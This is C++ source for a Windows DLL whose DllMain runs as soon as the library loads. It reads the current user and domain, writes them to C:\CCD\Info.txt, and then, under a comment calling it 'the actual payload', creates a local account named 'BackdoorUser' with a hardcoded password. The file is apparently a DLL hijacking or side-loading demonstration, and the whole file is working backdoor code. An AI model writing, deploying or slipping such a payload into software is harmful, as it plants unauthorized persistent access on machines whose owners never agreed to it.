#include <windows.h>
#include <sddl.h>
#include <lm.h>

#include <iostream>
#include <fstream>
#include <sstream>

#pragma comment(lib, "Netapi32.lib")

using namespace std;

void writeInfo(std::string &info)
{
    std::ofstream myInfoStream("C:\\CCD\\Info.txt");

    if (!myInfoStream.fail())
    {
        myInfoStream << "This is the info:\n";
        myInfoStream << info << "\n";
        myInfoStream.close();
    }
    else
    {
        std::cerr << std::strerror(errno) << "\n";
    }
}

int getUserDomainString(string &userAndDomain)
{
    int ret = 0;

    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
    {
        std::cerr << "Failed to open process token.\n";
        return 1;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) 
    {
        std::cerr << "Failed to get token information.\n";
        CloseHandle(hToken);
        free(pTokenUser);
        return 1;
    }

    LPWSTR userSid = nullptr;
    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &userSid)) 
    {
        std::cerr << "Failed to convert SID to string.\n";
        CloseHandle(hToken);
        free(pTokenUser);
        return 1;
    }

    CHAR name[256], domain[256];
    DWORD nameLen = 256, domainLen = 256;
    SID_NAME_USE sidType;

    if (LookupAccountSidA(nullptr, pTokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) 
    {
        std::stringstream sstrm;
        sstrm << domain << "\\" << name << std::endl;
        userAndDomain = sstrm.str();

    }
    else
    {
        std::cerr << "Failed to look up account SID.\n";
        ret = 1;
    }

    LocalFree(userSid);
    CloseHandle(hToken);
    free(pTokenUser);
    return ret;
}

bool userExists(LPWSTR username)
{
    LPUSER_INFO_0 pUserInfo = nullptr;
    NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);

    if (status == NERR_Success)
    {
        NetApiBufferFree(pUserInfo);
        return true;
    } 
    else if (status == NERR_UserNotFound)
    {
        return false;
    } 
    else
    {
        std::cerr << "Error checking user: " << status << std::endl;
        return false;
    }
}

void createUser(LPWSTR pUserName, LPWSTR passwd)
{
    // Set up user info
    USER_INFO_1 ui;
    ui.usri1_name = pUserName;
    ui.usri1_password = passwd;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = nullptr;
    ui.usri1_comment = nullptr;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = nullptr;

    DWORD dwError = 0;
    NET_API_STATUS nStatus = NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success)
    {
        wprintf(L"User created successfully.\n");
    }
    else
    {
        wprintf(L"Failed to create user. Error: %d\n", nStatus);
    }
}


BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (DLL_PROCESS_ATTACH == ul_reason_for_call)
    {
        // Called when the DLL is loaded into a process
        std::cout << "The DLL just got loaded.\n";
        std::string userAndDomain = "";
        if (getUserDomainString(userAndDomain) == 0)
        {
            std::cout << "User and domain: " << userAndDomain << "\n";
            writeInfo(userAndDomain);

            // The actual payload comes here
            if (!userExists(L"BackdoorUser"))
            {
                createUser(L"BackdoorUser", L"BackdoorPasswd");
            }
        }
        else
        {
            std::cerr << "Error: could not get user and domain.\n";
        }            
    }

    return TRUE;
}